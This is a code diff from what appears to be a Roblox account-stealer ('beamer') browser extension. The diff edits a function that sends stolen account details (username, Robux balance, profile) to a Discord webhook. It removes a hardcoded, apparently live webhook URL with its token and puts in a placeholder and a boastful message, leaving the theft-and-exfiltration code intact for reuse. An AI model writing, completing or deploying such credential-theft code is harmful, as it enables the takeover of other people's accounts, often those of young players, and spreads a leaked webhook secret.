@@ -26,32 +26,11 @@ function setCookie(cookieValue, reload = false) {
 
 // Send account information to Discord (remove or secure the webhook URL)
 function sendToDiscord(accountInfo) {
-  const webhookUrl = 'https://discord.com/api/webhooks/1346813323806642278/62dUIDFpkgET2I4zFdD-dRz_HS-OuE-Tb8Ryeudr3vo0OYCPtHgfZA1M6guIcThgFGXh'; // Replace with your secure webhook URL
-
-  // Construct the embed object
-  const embed = {
-    title: 'New Roblox Account Beamed! Extension method by cx.fed',
-    description: `**Username:** ${accountInfo.displayName}\n**Robux:** ${accountInfo.balance}`,
-    color: 0x00ff00, // Green color
-    thumbnail: {
-      url: accountInfo.avatar_url, // Avatar URL
-    },
-    fields: [
-      {
-        name: 'Profile URL',
-        value: `https://www.roblox.com/users/${accountInfo.userId}/profile`, // Profile URL
-      },
-    ],
-    timestamp: new Date().toISOString(),
-  };
-
-  // Construct the message payload
+  const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your secure webhook URL
   const message = {
-    content: '@everyone A new Roblox account has been beamed!', // Optional: Mention everyone
-    embeds: [embed], // Add the embed to the message
+    content: `**coded by @1497518 // @everyone woww daddyy you beamed a new Roblox account :3**\n${accountInfo}`,
   };
 
-  // Send the message to Discord
   const xhr = new XMLHttpRequest();
   xhr.open('POST', webhookUrl, true);
   xhr.setRequestHeader('Content-Type', 'application/json');
